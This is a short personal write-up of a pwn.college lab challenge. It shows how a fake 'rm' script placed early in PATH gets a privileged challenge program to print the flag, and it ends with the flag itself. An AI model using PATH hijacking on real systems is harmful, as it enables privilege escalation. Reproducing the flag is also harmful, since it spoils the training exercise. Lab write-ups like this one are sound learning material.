@@ -1,0 +1,26 @@
+# challenge: hijacking commands
+
+📅 2025-06-19
+📁 pondering path
+
+---
+
+## ✅ what i did  
+-clicked start
+-opened the terminal
+-ran: 'echo $PATH' -> 'PATH=/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
+-ran: 'vim rm'
+-typed: 'cat /flag'
+-ran: 'chomd a+x rm'
+-ran: 'PATH=/home/hacker:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
+-ran: '/challenge/run'
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+how to hijack a command by placing a custom script earlier in the PATH  
+in this case, we hijacked the rm command by replacing it w/ a script that prints the flag
+to make it work, it was necessary to ensure that the directory containing our fake rm came first in the PATH variable,
+so that the real rm command would not be called instead
+
+## 🏁 Flag  
+pwn.college{wjBTFanskrw0CDc6SfyNOcrbWi7.QX3cjM1wCO4IDOxEzW}
